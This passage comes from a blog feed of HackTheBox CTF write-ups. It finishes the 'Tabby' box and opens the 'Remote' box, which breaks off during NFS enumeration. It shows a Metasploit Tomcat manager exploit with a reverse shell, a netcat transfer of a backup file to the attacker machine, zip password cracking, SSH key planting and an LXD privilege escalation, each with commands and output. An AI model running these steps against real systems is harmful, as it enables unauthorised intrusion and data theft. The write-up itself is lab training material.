&lt;span class="code-line"&gt;  &amp;lt;user username=&amp;quot;tomcat&amp;quot; password=&amp;quot;$3cureP4s5w0rd123!&amp;quot; roles=&amp;quot;admin-gui,manager-script&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/tomcat-users&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As we are lazy, we fire up &lt;code&gt;metasploit&lt;/code&gt;, load the &lt;code&gt;tomcat_mgr_deploy&lt;/code&gt; module and
set the different option. As we have the permission for &lt;code&gt;manager-script&lt;/code&gt; we just
need to specify that our &lt;code&gt;PATH&lt;/code&gt; is &lt;code&gt;/manager/text&lt;/code&gt; instead of &lt;code&gt;manager&lt;/code&gt;. We also
need to set the target to &lt;code&gt;Java Universal&lt;/code&gt; and the payload to
&lt;code&gt;java/shell_reverse_tcp&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(multi/http/tomcat_mgr_deploy) &amp;gt; show options&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Module options (exploit/multi/http/tomcat_mgr_deploy):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Name          Current Setting     Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;  ----          ---------------     --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;  HttpPassword  $3cureP4s5w0rd123!  no        The password for the specified username&lt;/span&gt;
&lt;span class="code-line"&gt;  HttpUsername  tomcat              no        The username to authenticate as&lt;/span&gt;
&lt;span class="code-line"&gt;  PATH          /manager/text       yes       The URI path of the manager app (/deploy and /undeploy will be used)&lt;/span&gt;
&lt;span class="code-line"&gt;  Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]&lt;/span&gt;
&lt;span class="code-line"&gt;  RHOSTS        10.10.10.194        yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;  RPORT         8080                yes       The target port (TCP)&lt;/span&gt;
&lt;span class="code-line"&gt;  SSL           false               no        Negotiate SSL/TLS for outgoing connections&lt;/span&gt;
&lt;span class="code-line"&gt;  VHOST         megahosting.htb     no        HTTP server virtual host&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Payload options (java/shell_reverse_tcp):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Name   Current Setting  Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;  ----   ---------------  --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;  LHOST  10.10.14.113     yes       The listen address (an interface may be specified)&lt;/span&gt;
&lt;span class="code-line"&gt;  LPORT  4444             yes       The listen port&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit target:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Id  Name&lt;/span&gt;
&lt;span class="code-line"&gt;  --  ----&lt;/span&gt;
&lt;span class="code-line"&gt;  1   Java Universal&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we can run the exploit and get a simple shell on the box as the
&lt;code&gt;tomcat&lt;/code&gt;user.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(multi/http/tomcat_mgr_deploy) &amp;gt; run&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Started reverse TCP handler on 10.10.14.113:4444&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Using manually select target &amp;quot;Java Universal&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Uploading 13418 bytes as KFEu1gbH8s1QeOlaSH3qHMNO1H4.war ...&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Executing /KFEu1gbH8s1QeOlaSH3qHMNO1H4/u2A5WGIIbSw.jsp...&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Undeploying KFEu1gbH8s1QeOlaSH3qHMNO1H4 ...&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Command shell session 3 opened (10.10.14.113:4444 -&amp;gt; 10.10.10.194:55206) at 2020-06-21 12:36:01 -0400&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We know from the statement on the main website (port 80) that there was a
breach. Therefore we got the main website's directory in &lt;code&gt;/var/www/html&lt;/code&gt;. We
found a zip archive in the &lt;code&gt;files&lt;/code&gt; directory. We transfer it to our kali box
using netcat (we run &lt;code&gt;nc -l -p 1234 &amp;gt; 16162020_backup.zip&lt;/code&gt; on our kali box).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cd /var/www/html&lt;/span&gt;
&lt;span class="code-line"&gt;ls&lt;/span&gt;
&lt;span class="code-line"&gt;assets&lt;/span&gt;
&lt;span class="code-line"&gt;favicon.ico&lt;/span&gt;
&lt;span class="code-line"&gt;files&lt;/span&gt;
&lt;span class="code-line"&gt;index.php&lt;/span&gt;
&lt;span class="code-line"&gt;logo.png&lt;/span&gt;
&lt;span class="code-line"&gt;news.php&lt;/span&gt;
&lt;span class="code-line"&gt;Readme.txt&lt;/span&gt;
&lt;span class="code-line"&gt;ls files&lt;/span&gt;
&lt;span class="code-line"&gt;16162020_backup.zip&lt;/span&gt;
&lt;span class="code-line"&gt;archive&lt;/span&gt;
&lt;span class="code-line"&gt;revoked_certs&lt;/span&gt;
&lt;span class="code-line"&gt;statement&lt;/span&gt;
&lt;span class="code-line"&gt;nc -w 3 10.10.14.177 1234 &amp;lt;files/16162020_backup.zip&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use &lt;code&gt;zip2john&lt;/code&gt; to get a proper hash to crack and run &lt;code&gt;john&lt;/code&gt; with the
&lt;code&gt;rockyou&lt;/code&gt; dictionary and a few rules. We quickly get the &lt;code&gt;admin@it&lt;/code&gt; password
and are able to extract the archive content.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ zip2john 16162020_backup.zip &amp;gt; hash&lt;/span&gt;
&lt;span class="code-line"&gt;16162020_backup.zip/var/www/html/assets/ is not encrypted!&lt;/span&gt;
&lt;span class="code-line"&gt;ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type&lt;/span&gt;
&lt;span class="code-line"&gt;ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2&lt;/span&gt;
&lt;span class="code-line"&gt;ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type&lt;/span&gt;
&lt;span class="code-line"&gt;ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6&lt;/span&gt;
&lt;span class="code-line"&gt;ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F&lt;/span&gt;
&lt;span class="code-line"&gt;ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E&lt;/span&gt;
&lt;span class="code-line"&gt;ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3&lt;/span&gt;
&lt;span class="code-line"&gt;NOTE: It is assumed that all files in each archive have the same password.&lt;/span&gt;
&lt;span class="code-line"&gt;If that is not the case, the hash may be uncrackable. To avoid this, use&lt;/span&gt;
&lt;span class="code-line"&gt;option -o to pick a file at a time.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;$ john hash -w=~/tools/password_lists/rockyou.txt --rules&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (PKZIP [32/64])&lt;/span&gt;
&lt;span class="code-line"&gt;Will run 8 OpenMP threads&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;admin@it         (16162020_backup.zip)&lt;/span&gt;
&lt;span class="code-line"&gt;1g 0:00:00:01 DONE (2020-06-21 14:11) 0.6289g/s 6522Kp/s 6522Kc/s 6522KC/s adnbrie..adambossmaster&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As the content of the zip file is useless we "quickly" think about password
reuse. In order to use &lt;code&gt;su&lt;/code&gt; we need an better shell. As &lt;code&gt;python&lt;/code&gt; is not
installed on the box we just use &lt;code&gt;perl&lt;/code&gt;. Once we have a use shell we got to the
home directory and grab the user's flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/sh: 2: python: not found&lt;/span&gt;
&lt;span class="code-line"&gt;perl -e &amp;#39;exec &amp;quot;/bin/sh&amp;quot;;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;su ash&lt;/span&gt;
&lt;span class="code-line"&gt;Password: admin@it&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)&lt;/span&gt;
&lt;span class="code-line"&gt;cd&lt;/span&gt;
&lt;span class="code-line"&gt;649a18cc3a17b4de465381ff93c3fc65&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;Now that we have a shell as &lt;code&gt;ash&lt;/code&gt; we can just create a &lt;code&gt;.ssh&lt;/code&gt; directory and put
our SSH public key in the &lt;code&gt;.ssh/authorized_keys&lt;/code&gt; file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cd&lt;/span&gt;
&lt;span class="code-line"&gt;ls .ssh/&lt;/span&gt;
&lt;span class="code-line"&gt;ls: cannot access &amp;#39;.ssh/&amp;#39;: No such file or directory&lt;/span&gt;
&lt;span class="code-line"&gt;mkdir .ssh/&lt;/span&gt;
&lt;span class="code-line"&gt;echo &amp;#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCwES5PQLnAtM0JMAE4oyfsjruyj2bxjqZM55N5iMOGzqWt67KzQdbZYzRK5bvauo8xXtKEzzdvLNPHq0cS7v3vTiEIU3EcJGU1jjDN7tiUpUhc+KvVE0gR5JcScwGy8HSYI/PvbHiMSSH7e25r76G5EUpkxwjs4u+Kul7/24oMSvwLlI5u7R9OPTuMplfeLppp/EbVtNa/bWjFZ3CFFWFVyux/1ig16VaQXZxXJSGmElrAVUnA3eQbZYhs3ApavTnVmejz39BgNAoW0cPcXxM8t4ovNLdLxGPF728eFqABnOB/DFHkvK6oD8pdRL6IQYa5kYWx445aHZattAPv5JpGi0+Kt+kC1ZJPwn0trw2FceTOEcNhQlQ7jyAcWAUUCEMFIaJ6r85jHP0WWavCA39XwpicH/XymMBKppywqQ9+Z2GEY0MsnIvbYedkduXxCi6FrRvtWVNkI7GS52txVRvBy5U7LtwYs1DWH0tC+0C+/l+GbUTIw68Gw2msvu5HTHH+8KWxnBjwxqxySK7dXcrEJ+ZZO5HrJWJ2Gyds6CwSq9E8wo+ylkgR+4VvRq4Fc+QiQLp7WTeACo19LpC9n3z1LuQH9E0jSZGqNugO1PRzsN2HrD7VsOC0Go8+UoYGzVyrMnmR58xxDUGyXCxxss7bB6ZCB8bPGPDkQXDHpEhkeQ== kali@kali&amp;#39; &amp;gt; .ssh/authorized_keys&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can now connect to the box using SSH.&lt;/p&gt;
&lt;p&gt;When looking at our groups we saw that we are in the &lt;code&gt;lxd&lt;/code&gt; group. This can lead
to a &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#lxclxd"&gt;"quick" privilege escalation&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ash@tabby:~$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;On our kali box we clone and build the Alpine image then we copy it to the box.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ git clone https://github.com/saghul/lxd-alpine-builder&lt;/span&gt;
&lt;span class="code-line"&gt;Cloning into &amp;#39;lxd-alpine-builder&amp;#39;...&lt;/span&gt;
&lt;span class="code-line"&gt;remote: Enumerating objects: 27, done.&lt;/span&gt;
&lt;span class="code-line"&gt;remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27&lt;/span&gt;
&lt;span class="code-line"&gt;Receiving objects: 100% (27/27), 16.00 KiB | 4.00 MiB/s, done.&lt;/span&gt;
&lt;span class="code-line"&gt;Resolving deltas: 100% (6/6), done.&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~$ cd lxd-alpine-builder/&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~/lxd-alpine-builder$ sudo ./build-alpine -a i686&lt;/span&gt;
&lt;span class="code-line"&gt;[sudo] password for kali:&lt;/span&gt;
&lt;span class="code-line"&gt;Determining the latest release... v3.12&lt;/span&gt;
&lt;span class="code-line"&gt;Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~/lxd-alpine-builder$ scp -r alpine-v3.12-i686-20200621_1247.tar.gz  ash@10.10.10.194:/tmp/.plop/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We try to import the Alpine image but &lt;code&gt;LXD&lt;/code&gt; is not initialize so we use &lt;code&gt;lxc
init&lt;/code&gt; to initialize the environment with the default values.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ash@tabby:/tmp/.plop$ lxc image import ./alpine-v3.12-i686-20200621_1247.tar.gz --alias myimage&lt;/span&gt;
&lt;span class="code-line"&gt;If this is your first time running LXD on this machine, you should also run: lxd init&lt;/span&gt;
&lt;span class="code-line"&gt;To start your first instance, try: lxc launch ubuntu:18.04&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Image imported with fingerprint: c88a85d7bdacce8f8acc47713ad553e76b3fbb7d7027ba3cd5479e6085bba865&lt;/span&gt;
&lt;span class="code-line"&gt;ash@tabby:/tmp/.plop$ lxc init myimage mycontainer -c security.privileged=true&lt;/span&gt;
&lt;span class="code-line"&gt;Creating mycontainer&lt;/span&gt;
&lt;span class="code-line"&gt;Error: No storage pool found. Please create a new storage pool&lt;/span&gt;
&lt;span class="code-line"&gt;ash@tabby:/tmp/.plop$ lxc init myimage mycontainer -c security.privileged=true&lt;/span&gt;
&lt;span class="code-line"&gt;Creating mycontainer&lt;/span&gt;
&lt;span class="code-line"&gt;Error: No storage pool found. Please create a new storage pool&lt;/span&gt;
&lt;span class="code-line"&gt;ash@tabby:/tmp/.plop$ lxd init&lt;/span&gt;
&lt;span class="code-line"&gt;Would you like to use LXD clustering? (yes/no) [default=no]:&lt;/span&gt;
&lt;span class="code-line"&gt;Do you want to configure a new storage pool? (yes/no) [default=yes]:&lt;/span&gt;
&lt;span class="code-line"&gt;Name of the new storage pool [default=default]: ^[&lt;/span&gt;
&lt;span class="code-line"&gt;Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]:&lt;/span&gt;
&lt;span class="code-line"&gt;Create a new BTRFS pool? (yes/no) [default=yes]:&lt;/span&gt;
&lt;span class="code-line"&gt;Would you like to use an existing block device? (yes/no) [default=no]:&lt;/span&gt;
&lt;span class="code-line"&gt;Size in GB of the new loop device (1GB minimum) [default=15GB]:&lt;/span&gt;
&lt;span class="code-line"&gt;Would you like to connect to a MAAS server? (yes/no) [default=no]:&lt;/span&gt;
&lt;span class="code-line"&gt;Would you like to create a new local network bridge? (yes/no) [default=yes]:&lt;/span&gt;
&lt;span class="code-line"&gt;What should the new bridge be called? [default=lxdbr0]:&lt;/span&gt;
&lt;span class="code-line"&gt;What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:&lt;/span&gt;
&lt;span class="code-line"&gt;What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:&lt;/span&gt;
&lt;span class="code-line"&gt;Would you like LXD to be available over the network? (yes/no) [default=no]:&lt;/span&gt;
&lt;span class="code-line"&gt;Would you like stale cached images to be updated automatically? (yes/no) [default=yes]&lt;/span&gt;
&lt;span class="code-line"&gt;Would you like a YAML &amp;quot;lxd init&amp;quot; preseed to be printed? (yes/no) [default=no]:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we can initialize our container, mount the whole disk on the container
image and grab the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ash@tabby:/tmp/.plop$ lxc init myimage mycontainer -c security.privileged=true&lt;/span&gt;
&lt;span class="code-line"&gt;Creating mycontainer&lt;/span&gt;
&lt;span class="code-line"&gt;ash@tabby:/tmp/.plop$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true&lt;/span&gt;
&lt;span class="code-line"&gt;Device mydevice added to mycontainer&lt;/span&gt;
&lt;span class="code-line"&gt;ash@tabby:/tmp/.plop$ lxc start mycontainer&lt;/span&gt;
&lt;span class="code-line"&gt;ash@tabby:/tmp/.plop$ lxc exec mycontainer /bin/sh&lt;/span&gt;
&lt;span class="code-line"&gt;~ # ls /mnt/root/&lt;/span&gt;
&lt;span class="code-line"&gt;bin/         cdrom/       etc/         lib/         lib64/       lost+found/  mnt/         proc/        run/         snap/        swap.img     tmp/         var/&lt;/span&gt;
&lt;span class="code-line"&gt;boot/        dev/         home/        lib32/       libx32/      media/       opt/         root/        sbin/        srv/         sys/         usr/&lt;/span&gt;
&lt;span class="code-line"&gt;~ # ls /mnt/root/root/&lt;/span&gt;
&lt;span class="code-line"&gt;root.txt  snap&lt;/span&gt;
&lt;span class="code-line"&gt;~ # cat /mnt/root/root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;37cb707151d0433a17886caba89f81e1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We don't have a root shell for that we will need to modify &lt;code&gt;/etc/shadow&lt;/code&gt; in
order to modify the root password as we already did on the
&lt;a href="/2020/10/htb-cache.html"&gt;cache box&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was quit easy. The password reuse take me more time to realize as it
should have been. I recommend this box to beginners.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Linux"></category><category term="tomcat"></category><category term="zip"></category><category term="lxd"></category><category term="lxc"></category><category term="LFI"></category></entry><entry><title>HTB: Remote</title><link href="https://maggick.fr/2020/11/htb-remote.html" rel="alternate"></link><published>2020-11-10T20:50:00+01:00</published><updated>2020-11-10T20:50:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-11-10:/2020/11/htb-remote.html</id><summary type="html">&lt;p&gt;&lt;img alt="Remote card" class="align-left" src="/media/2020.11/remote_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/234"&gt;Remote&lt;/a&gt; published by
&lt;a href="https://www.hackthebox.eu/home/users/profile/2984"&gt;mrb3n&lt;/a&gt; on Mars the 21th 2020.
This box is a Windows machine classified as easy. It implies a NFS share, a
vulnerable CMS, TeamViewer and a second unintended way towards root.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.11/remote_card.png" alt="Remote card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/234"&gt;Remote&lt;/a&gt; published by
&lt;a href="https://www.hackthebox.eu/home/users/profile/2984"&gt;mrb3n&lt;/a&gt; on Mars the 21th 2020.
This box is a Windows machine classified as easy. It implies a NFS share, a
vulnerable CMS, TeamViewer and a second unintended way towards root.&lt;/p&gt;


&lt;h1 id="initial-foothold"&gt;Initial foothold&lt;/h1&gt;
&lt;p&gt;We start with an nmap scan. 10 ports are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Thu Mar 26 10:51:40 2020 as: nmap -sS -oN nmap2 --top-ports=10000 -sV 10.10.10.180&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.180&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.30s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 8310 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE       VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;21/tcp    open  ftp           Microsoft ftpd&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;111/tcp   open  rpcbind       2-4 (RPC #100000)&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp   open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds?&lt;/span&gt;
&lt;span class="code-line"&gt;2049/tcp  open  mountd        1-3 (RPC #100005)&lt;/span&gt;
&lt;span class="code-line"&gt;5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;49678/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Thu Mar 26 11:02:07 2020 -- 1 IP address (1 host up) scanned in 626.37 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;For each port we will look what service is running an how we can enumerate them:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Port 21: FTP, &lt;strong&gt;we will dig it more&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Port 80: A website, &lt;strong&gt;we will dig it more&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Port 111: rpcbind, nothing here&lt;/li&gt;
&lt;li&gt;Port 135: MS Windows RPC, nothing here&lt;/li&gt;
&lt;li&gt;Port 139 and 445: SMB, &lt;strong&gt;we will dig it more&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Port 2049: NFS, &lt;strong&gt;we will dig it more&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Port 5985: some HTTP service but nothing available&lt;/li&gt;
&lt;li&gt;Port 47001: some HTTP service but nothing available&lt;/li&gt;
&lt;li&gt;Port 49678: MS Windows RPC, nothing here&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="ftp"&gt;FTP&lt;/h2&gt;
&lt;p&gt;We try to connect to the FTP using an anonymous connection. At this time (Mars
27th 2020) Firefox still support this protocol. But there is no file available
with the anonymous account.&lt;/p&gt;
&lt;p&gt;&lt;img alt="anonymous FTP" src="/media/2020.11/remote_02.png"&gt;&lt;/p&gt;
&lt;h2 id="smb"&gt;SMB&lt;/h2&gt;
&lt;p&gt;We try to enumerate the SMB share and users using the metasploit modules
&lt;code&gt;auxiliary/scanner/smb/smb_enumshares&lt;/code&gt; and
&lt;code&gt;auxiliary/scanner/smb/smb_enumshares&lt;/code&gt; but there is nothing interesting here.&lt;/p&gt;
&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The home page is about selling products. We quickly browse the website but
nothing really pop out.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Website homepage" src="/media/2020.11/remote_04.png"&gt;&lt;/p&gt;
&lt;p&gt;We run &lt;a href="https://github.com/ffuf/ffuf"&gt;fuff&lt;/a&gt; a &lt;code&gt;Go&lt;/code&gt; equivalent of &lt;code&gt;dirb&lt;/code&gt; with the
&lt;code&gt;big.txt&lt;/code&gt; wordlist from dirb. This allow us to found the "umbraco" login page.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ./ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.180/FUZZ -mc 200 -c -v&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[Status: 200, Size: 4040, Words: 710, Lines: 96]&lt;/span&gt;
&lt;span class="code-line"&gt;| URL | http://10.10.10.180/umbraco&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img alt="Umbraco login page" src="/media/2020.11/remote_01.png"&gt;&lt;/p&gt;
&lt;p&gt;There is a few exploits for this CMS but we do not have any credentials to login.&lt;/p&gt;
&lt;h2 id="nfs"&gt;NFS&lt;/h2&gt;
&lt;p&gt;We enumerate the NFS share using the &lt;code&gt;auxiliary/scanner/nfs/nfsmount&lt;/code&gt; metasploit
module. We found that the share &lt;code&gt;/site_backups&lt;/code&gt; is exposed.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 &amp;gt; use auxiliary/scanner/nfs/nfsmount&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(scanner/nfs/nfsmount) &amp;gt; set RhOSTS 10.10.10.180&lt;/span&gt;
&lt;span class="code-line"&gt;RhOSTS =&amp;gt; 10.10.10.180&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(scanner/nfs/nfsmount) &amp;gt; run&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] 10.10.10.180:111      - 10.10.10.180 NFS Export: /site_backups []&lt;/span&gt;
